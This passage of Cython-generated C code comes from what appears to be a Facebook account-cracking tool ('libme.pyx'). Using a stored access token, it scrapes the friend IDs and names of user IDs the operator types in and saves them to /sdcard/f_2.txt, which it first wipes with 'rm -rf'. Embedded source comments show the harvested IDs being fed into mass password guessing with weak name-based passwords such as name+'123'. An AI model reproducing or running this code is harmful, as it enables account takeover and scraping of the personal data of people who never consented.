        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_9); __Pyx_INCREF(__pyx_t_4); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 710, __pyx_L1_error)
        #else
        __pyx_t_4 = PySequence_ITEM(__pyx_t_6, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 710, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
        #endif
      }
    } else {
      __pyx_t_4 = __pyx_t_10(__pyx_t_6);
      if (unlikely(!__pyx_t_4)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 710, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_4);
    }
    __Pyx_XDECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":711
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):
 * 			zx += 1             # <<<<<<<<<<<<<<
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 */
    __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_v_zx, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 711, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF_SET(__pyx_v_zx, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":712
 * 		for zx in range(__total):
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")             # <<<<<<<<<<<<<<
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 */
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__36, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 712, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_XDECREF_SET(__pyx_v___ids, __pyx_t_4);
    __pyx_t_4 = 0;

    /* "libme.pyx":713
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        /* "libme.pyx":714
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))             # <<<<<<<<<<<<<<
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 714, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 714, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (unlikely(!__pyx_v_token)) { __Pyx_RaiseUnboundLocalError("token"); __PYX_ERR(0, 714, __pyx_L21_error) }
        __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 714, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_v___ids);
        __Pyx_GIVEREF(__pyx_v___ids);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v___ids);
        __Pyx_INCREF(__pyx_v_token);
        __Pyx_GIVEREF(__pyx_v_token);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_v_token);
        __pyx_t_11 = __Pyx_PyString_Format(__pyx_kp_s_https_graph_facebook_com_s_field, __pyx_t_5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 714, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_5, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 714, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":715
 * 			try:
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)             # <<<<<<<<<<<<<<
 * 				file = open(_____ , 'a')
 * 				id = []
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 715, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_loads); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 715, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_rex, __pyx_n_s_text); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 715, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 715, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ex, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":716
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')             # <<<<<<<<<<<<<<
 * 				id = []
 * 				for a in ex['friends']['data']:
 */
        __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 716, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v______);
        __Pyx_GIVEREF(__pyx_v______);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v______);
        __Pyx_INCREF(__pyx_n_s_a);
        __Pyx_GIVEREF(__pyx_n_s_a);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_a);
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 716, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_file, __pyx_t_11);
        __pyx_t_11 = 0;

        /* "libme.pyx":717
 * 				ex=json.loads(rex.text)
 * 				file = open(_____ , 'a')
 * 				id = []             # <<<<<<<<<<<<<<
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 */
        __pyx_t_11 = PyList_New(0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 717, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":718
 * 				file = open(_____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 718, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 718, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 718, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 718, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 718, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 718, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 718, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 718, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 718, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":719
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 719, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 719, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 719, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_5 = PyNumber_Add(__pyx_t_8, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 719, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_14 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 719, __pyx_L21_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":720
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_15 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_16 = PyNumber_Add(__pyx_t_15, __pyx_t_8); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = PyNumber_Add(__pyx_t_16, __pyx_kp_s__39); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_5 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_16, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 720, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":718
 * 				file = open(_____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":713
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":721
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__ma__sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 721, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_4);

        /* "libme.pyx":722
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()
 */
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 722, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":713
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":710
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":723
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 723, __pyx_L1_error) }
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 723, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 723, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":724
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 */
  __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v______);
  __Pyx_GIVEREF(__pyx_v______);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v______);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":725
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 725, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 725, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 725, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 725, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":726
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))             # <<<<<<<<<<<<<<
 * 	def __Frrr__(self):
 * 		try:
 */
  __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_File_saved_in_s, __pyx_v______); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 726, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":699
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __ma__sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("libme.James.__ma__sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v______);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":727
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Frrr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f_2.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_47__Frrr__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_47__Frrr__ = {"__Frrr__", (PyCFunction)__pyx_pw_5libme_5James_47__Frrr__, METH_O, 0};
